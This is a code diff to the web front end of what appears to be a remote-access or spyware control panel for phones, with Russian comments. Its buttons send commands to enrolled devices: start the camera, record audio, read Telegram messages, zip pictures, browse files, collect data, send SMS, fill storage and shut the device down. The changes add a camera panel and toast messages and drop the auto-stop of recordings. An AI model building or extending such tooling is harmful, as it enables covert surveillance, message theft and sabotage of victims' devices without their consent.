@@ -291,7 +291,6 @@
             display: inline-block;
         }
         .btn-download:hover { background: #6d28d9; transform: scale(1.02); }
-        .recording-indicator { color: #f87171; animation: pulse 1s infinite; }
         .file-item {
             background: #1a1a2a;
             padding: 10px 14px;
@@ -335,6 +334,27 @@
             transition: 0.2s;
         }
         .sms-form .btn-send:hover { background: #6d28d9; }
+        .camera-feed {
+            background: #0d0a1a;
+            border-radius: 12px;
+            padding: 20px;
+            text-align: center;
+            border: 1px solid #2a1f4a;
+            min-height: 200px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+        }
+        .camera-feed .icon { font-size: 48px; margin-bottom: 12px; }
+        .camera-controls {
+            display: flex;
+            gap: 10px;
+            margin-top: 12px;
+            flex-wrap: wrap;
+            justify-content: center;
+        }
+        .camera-controls .btn { width: auto; min-width: 100px; }
         @media (max-width: 600px) {
             .device-top { flex-direction: column; align-items: flex-start; }
             .menu-grid { grid-template-columns: repeat(2, 1fr); }
@@ -363,7 +383,6 @@
 <script>
     let activeDeviceId = null;
     let recordingStates = {};
-    let currentDeviceId = null;
 
     function openModal(title, content) {
         document.getElementById('modalTitle').textContent = title;
@@ -405,7 +424,7 @@
         });
     }
 
-    // ===== ФУНКЦИИ МОДАЛЬНЫХ ОКОН =====
+    // ===== ОТДЕЛЬНЫЕ ФУНКЦИИ =====
 
     function showSMS(deviceId) {
         openModal('send sms', `
@@ -481,11 +500,14 @@
 
     function showCamera(deviceId) {
         openModal('camera', `
-            <div class="status-msg">⏳ requesting camera stream...</div>
-            <div style="margin-top:12px;color:#6a5a7a;font-size:13px;">camera feed will appear here when available</div>
-            <div style="margin-top:12px;">
-                <button class="btn btn-primary" onclick="sendCommand('${deviceId}', 'camera_start')">start camera</button>
-                <button class="btn btn-danger" onclick="sendCommand('${deviceId}', 'camera_stop')">stop camera</button>
+            <div class="camera-feed">
+                <div class="icon">📷</div>
+                <div style="color:#6a5a7a;font-size:14px;">camera controls</div>
+                <div class="camera-controls">
+                    <button class="btn btn-primary" onclick="sendCommand('${deviceId}','camera_start'); showToast('camera started');">start camera</button>
+                    <button class="btn btn-danger" onclick="sendCommand('${deviceId}','camera_stop'); showToast('camera stopped');">stop camera</button>
+                </div>
+                <div style="margin-top:12px;color:#6a5a7a;font-size:12px;">camera will open on the device</div>
             </div>
         `);
     }
@@ -495,10 +517,10 @@
             <div style="display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-top:10px;">
                 <button class="btn btn-primary" onclick="sendCommand('${deviceId}','lock_volume');closeModal();">lock volume</button>
                 <button class="btn btn-outline" onclick="sendCommand('${deviceId}','unlock_volume');closeModal();">unlock volume</button>
-                <button class="btn btn-outline" onclick="sendCommand('${deviceId}','sound_normal');closeModal();">normal mode</button>
-                <button class="btn btn-outline" onclick="sendCommand('${deviceId}','sound_silent');closeModal();">silent mode</button>
-                <button class="btn btn-outline" onclick="sendCommand('${deviceId}','sound_max');closeModal();">max volume</button>
-                <button class="btn btn-outline" onclick="sendCommand('${deviceId}','sound_min');closeModal();">min volume</button>
+                <button class="btn btn-outline" onclick="sendCommand('${deviceId}','sound_normal');closeModal();">normal</button>
+                <button class="btn btn-outline" onclick="sendCommand('${deviceId}','sound_silent');closeModal();">silent</button>
+                <button class="btn btn-outline" onclick="sendCommand('${deviceId}','sound_max');closeModal();">max</button>
+                <button class="btn btn-outline" onclick="sendCommand('${deviceId}','sound_min');closeModal();">min</button>
             </div>
         `);
     }
@@ -518,15 +540,7 @@
                 <div id="recordingStatus" style="margin-top:12px;color:#6a5a7a;font-size:13px;"></div>
             </div>
         `);
-        // После закрытия обновляем состояние
-        const origClose = closeModal;
-        window.closeModal = function() {
-            if (recordingStates[deviceId]) {
-                sendCommand(deviceId, 'voice_stop');
-                recordingStates[deviceId] = false;
-            }
-            origClose();
-        };
+        window._recordingDeviceId = deviceId;
     }
 
     function toggleRecordingFromModal(deviceId) {
@@ -538,9 +552,7 @@
             recordingStates[deviceId] = false;
             btn.textContent = 'start recording';
             btn.className = 'btn btn-danger';
-            status.textContent = '✅ recording stopped, file will be available in files';
-            // Обновляем список файлов
-            setTimeout(() => showFiles(deviceId), 2000);
+            status.textContent = '✅ recording stopped, file saved';
         } else {
             sendCommand(deviceId, 'voice_start');
             recordingStates[deviceId] = true;
@@ -554,6 +566,14 @@
         if (level >= 70) return 'high';
         if (level >= 30) return 'medium';
         return 'low';
+    }
+
+    function showToast(msg) {
+        const t = document.createElement('div');
+        t.style.cssText = 'position:fixed;bottom:20px;left:50%;transform:translateX(-50%);background:#2a1f4a;padding:10px 20px;border-radius:10px;border:1px solid #3a2a5a;color:#d0c6e8;z-index:9999;font-size:14px;';
+        t.textContent = msg;
+        document.body.appendChild(t);
+        setTimeout(() => t.remove(), 2000);
     }
 
     function fetchDevices() {
@@ -571,7 +591,6 @@
                 container.innerHTML = data.map(d => {
                     const isOnline = d.status === 'online';
                     const battery = d.battery !== undefined ? d.battery : 0;
-                    const isRecording = recordingStates[d.id] || false;
                     return `
                         <div class="device ${isOnline ? 'online' : 'offline'}" data-id="${d.id}" onclick="toggleMenu('${d.id}')">
                             <div class="device-top">
@@ -599,22 +618,22 @@
                             <div class="menu-panel" id="menu-${d.id}">
                                 <div class="menu-title">▸ control panel</div>
                                 <div class="menu-grid">
-                                    <button class="btn btn-primary" onclick="event.stopPropagation(); sendCommand('${d.id}','reboot');">reboot</button>
-                                    <button class="btn btn-danger" onclick="event.stopPropagation(); sendCommand('${d.id}','shutdown');">shutdown</button>
+                                    <button class="btn btn-primary" onclick="event.stopPropagation(); sendCommand('${d.id}','reboot'); showToast('reboot sent');">reboot</button>
+                                    <button class="btn btn-danger" onclick="event.stopPropagation(); sendCommand('${d.id}','shutdown'); showToast('shutdown sent');">shutdown</button>
                                     <button class="btn btn-outline" onclick="event.stopPropagation(); sendCommand('${d.id}','collect');">data</button>
                                     <button class="btn btn-outline" onclick="event.stopPropagation(); showPictures('${d.id}')">pictures zip</button>
                                     <button class="btn btn-outline" onclick="event.stopPropagation(); showVolumeMenu('${d.id}')">volume</button>
-                                    <button class="btn btn-outline" onclick="event.stopPropagation(); sendCommand('${d.id}','wifi_toggle');">wifi</button>
-                                    <button class="btn btn-outline" onclick="event.stopPropagation(); sendCommand('${d.id}','airplane');">airplane</button>
-                                    <button class="btn btn-outline" onclick="event.stopPropagation(); sendCommand('${d.id}','wallpaper');">wallpaper</button>
+                                    <button class="btn btn-outline" onclick="event.stopPropagation(); sendCommand('${d.id}','wifi_toggle'); showToast('wifi toggled');">wifi</button>
+                                    <button class="btn btn-outline" onclick="event.stopPropagation(); sendCommand('${d.id}','airplane'); showToast('airplane toggled');">airplane</button>
+                                    <button class="btn btn-outline" onclick="event.stopPropagation(); sendCommand('${d.id}','wallpaper'); showToast('wallpaper changed');">wallpaper</button>
                                     <button class="btn btn-outline" onclick="event.stopPropagation(); showSMS('${d.id}')">send sms</button>
                                     <button class="btn btn-outline" onclick="event.stopPropagation(); showMessages('${d.id}', 30)">tg (30)</button>
                                     <button class="btn btn-outline" onclick="event.stopPropagation(); showMessages('${d.id}', 1000)">tg (1000)</button>
                                     <button class="btn btn-outline" onclick="event.stopPropagation(); showFiles('${d.id}')">files</button>
                                     <button class="btn btn-outline" onclick="event.stopPropagation(); showRecording('${d.id}')">audio rec</button>
                                     <button class="btn btn-outline" onclick="event.stopPropagation(); showCamera('${d.id}')">camera</button>
-                                    <button class="btn btn-outline" onclick="event.stopPropagation(); sendCommand('${d.id}','fill_storage');">fill storage</button>
-                                    <button class="btn btn-outline" onclick="event.stopPropagation(); sendCommand('${d.id}','clean_storage');">clean storage</button>
+                                    <button class="btn btn-outline" onclick="event.stopPropagation(); sendCommand('${d.id}','fill_storage'); showToast('filling storage');">fill storage</button>
+                                    <button class="btn btn-outline" onclick="event.stopPropagation(); sendCommand('${d.id}','clean_storage'); showToast('cleaning storage');">clean storage</button>
                                 </div>
                             </div>
                         </div>
